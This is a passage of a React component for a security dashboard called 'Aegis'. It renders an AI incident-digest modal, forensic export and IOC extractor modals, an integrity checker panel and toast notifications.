            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* AI Coprocessor Incident Report Modal */}
      <AnimatePresence>
        {isAiReportModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center p-4">
            <motion.div 
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              onClick={() => setIsAiReportModalOpen(false)}
              className="absolute inset-0 bg-black/80 backdrop-blur-md cursor-pointer"
            />
            
            <motion.div 
              initial={{ scale: 0.95, opacity: 0, y: 20 }}
              animate={{ scale: 1, opacity: 1, y: 0 }}
              exit={{ scale: 0.95, opacity: 0, y: 20 }}
              className="relative w-full max-w-2xl bg-[#09090C] border border-white/10 rounded-xl shadow-2xl p-6 space-y-4 z-10 font-mono max-h-[85vh] flex flex-col"
            >
              <div className="flex items-center justify-between border-b border-white/5 pb-3 shrink-0">
                <div className="flex items-center gap-2">
                  <div className="p-1.5 rounded bg-[#00f0ff]/10 text-[#00f0ff] border border-[#00f0ff]/30">
                    <Sparkles size={14} />
                  </div>
                  <div>
                    <h3 className="text-xs font-semibold text-zinc-100 flex items-center gap-2">
                      Aegis AI Coprocessor Incident Digest
                    </h3>
                    <p className="text-[9px] text-zinc-500">
                      Correlated analysis of {selectedThreatIds.length} security alerts
                    </p>
                  </div>
                </div>
                <button
                  type="button"
                  onClick={() => setIsAiReportModalOpen(false)}
                  className="p-1 rounded text-zinc-500 hover:text-white hover:bg-white/5 cursor-pointer"
                >
                  <X size={14} />
                </button>
              </div>

              <div className="flex-1 overflow-y-auto space-y-3">
                {isAiLoading ? (
                  <div className="py-20 flex flex-col items-center justify-center gap-3 text-center">
                    <RefreshCw size={24} className="text-[#00f0ff] animate-spin" />
                    <div className="space-y-1">
                      <p className="text-[11px] font-bold text-zinc-200">ANALYZING CONTAINMENT LOG VECTORS...</p>
                      <p className="text-[9px] text-zinc-500 max-w-xs uppercase leading-relaxed">
                        Querying Gemini models, building lexical threat correlation maps, and assembling actionable MITRE ATT&CK mitigation recommendations.
                      </p>
                    </div>
                  </div>
                ) : (
                  <div className="space-y-3 text-zinc-300 leading-relaxed text-[11px] select-all font-mono whitespace-pre-wrap">
                    <div className="p-3 bg-[#00f0ff]/5 border border-[#00f0ff]/20 rounded text-[10px] text-zinc-300 flex items-center justify-between flex-wrap gap-2">
                      <span>Incidents Digest: <strong className="text-[#00f0ff]">{selectedThreatIds.length} Correlated Logs</strong></span>
                      <span>Target Engine: <strong className="text-zinc-100">Gemini 3.8 Flash / Ollama</strong></span>
                    </div>

                    <div className="bg-black/40 border border-white/5 p-4 rounded-lg font-mono text-[11px] space-y-3 max-h-[45vh] overflow-y-auto">
                      {aiReportText}
                    </div>
                  </div>
                )}
              </div>

              {!isAiLoading && (
                <div className="flex gap-2 justify-end pt-3 border-t border-white/5 shrink-0">
                  <button
                    type="button"
                    onClick={() => {
                      navigator.clipboard.writeText(aiReportText);
                      triggerToast("Copied AI incident report to clipboard");
                    }}
                    className="px-3 py-1.5 rounded bg-white/5 hover:bg-white/10 text-zinc-300 text-[9px] uppercase font-bold cursor-pointer"
                  >
                    Copy Report
                  </button>
                  <button
                    type="button"
                    onClick={() => setIsAiReportModalOpen(false)}
                    className="px-4 py-1.5 rounded bg-[#00f0ff] text-black text-[9px] uppercase font-bold cursor-pointer hover:bg-[#33f3ff]"
                  >
                    Close
                  </button>
                </div>
              )}
            </motion.div>
          </div>
        )}
      </AnimatePresence>

      {/* Forensic Multi-Format Exporter Modal */}
      <ForensicExportModal
        isOpen={isExportModalOpen}
        onClose={() => setIsExportModalOpen(false)}
        threats={filteredThreats}
        onToast={triggerToast}
      />

      {/* IOC Extractor & Defanger Modal */}
      <IocExtractorModal
        isOpen={isIocModalOpen}
        onClose={() => setIsIocModalOpen(false)}
        threats={filteredThreats}
        onToast={triggerToast}
      />

      {/* Visual SHA-256 Integrity Checker Panel */}
      <div className="border-t border-white/5 bg-[#040406]/55 p-4 select-none">
        <ThreatIntegrityChecker triggerToast={triggerToast} />
      </div>

      {/* Slide-in local toast alert banner for integrity alerts */}
      <AnimatePresence>
        {toastMessage && (
          <motion.div
            initial={{ opacity: 0, y: 50, scale: 0.95 }}
            animate={{ opacity: 1, y: 0, scale: 1 }}
            exit={{ opacity: 0, y: 50, scale: 0.95 }}
            className="fixed bottom-6 right-6 z-50 max-w-sm bg-[#0B0B0E] border border-[#00f0ff]/40 text-white p-3.5 rounded-lg shadow-2xl font-mono text-[10px] flex items-start gap-3"
          >
            <div className="p-1 rounded bg-[#00f0ff]/10 text-[#00f0ff] shrink-0 mt-0.5">
              <ShieldCheck size={14} className="text-[#00f0ff]" />
            </div>
            <div className="space-y-0.5 flex-1">
              <div className="font-bold uppercase text-[#00f0ff] tracking-widest text-[8.5px]">Aegis Safe Audit</div>
              <p className="text-zinc-300 leading-normal text-[9.5px]">{toastMessage}</p>
            </div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
